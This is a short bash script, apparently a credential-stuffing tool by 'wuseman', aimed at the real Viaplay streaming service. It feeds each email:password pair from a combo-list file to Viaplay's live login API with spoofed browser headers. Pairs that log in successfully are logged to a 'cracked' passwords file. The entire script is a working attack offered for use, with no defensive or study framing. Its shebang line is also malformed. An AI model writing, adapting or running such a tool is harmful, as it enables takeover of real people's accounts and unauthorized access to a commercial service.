#/!bin/bash

banner() {
cat << "EOF"
                 _             _
__      ____   _(_) __ _ _ __ | | __ _ _   _
\ \ /\ / /\ \ / / |/ _` | '_ \| |/ _` | | | |
 \ V  V /  \ V /| | (_| | |_) | | (_| | |_| | Author: wuseman
  \_/\_/    \_/ |_|\__,_| .__/|_|\__,_|\__, | Version: 1.0
                        |_|            |___/
---------------------------------------------------------------
EOF
}

if [[ -z "$1" ]]; then
   banner
   echo -e "You must choose at least one database ... "
   exit 1
fi

banner
URL="https://login.viaplay.se/api/login/v1?deviceKey=pcdash-se&returnurl=https%3A%2F%2Fcontent.viaplay.se%2Fpcdash-se&username"


while read line; do
USER=$(echo $line|cut -d: -f1|sed 's/@/%40/g')
PASSWORD="$(echo $line|cut -d':' -f2)"

curl -s "$URL=$USER&persistent=true" \
       -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0" \
       -H "Accept: application/json" \
       -H "Accept-Language: en-US,en;q=0.5" \
       -H "Referer: https://viaplay.se/" \
       -H "Content-Type: application/x-www-form-urlencoded; charset=utf-8" \
       -H "Origin: https://viaplay.se" \
       -H "Connection: keep-alive" \
       -H "Cookie: cookie_agreement=true" \
       -H "DNT: 1" \
       --data "password=$PASSWORD"| grep -q "mtg-api.com"

  if [[ "$?" = "0" ]]; then
      echo -e "[\e[1;32m+\e[0m] - Password Cracked: $USER:$PASSWORD" |tee -a ~/cracked-viaplay-passwords.txt
  else
      echo -e "[\e[1;31m-\e[0m] - Wrong Password: $USER:$PASSWORD"
  fi
done < $1 
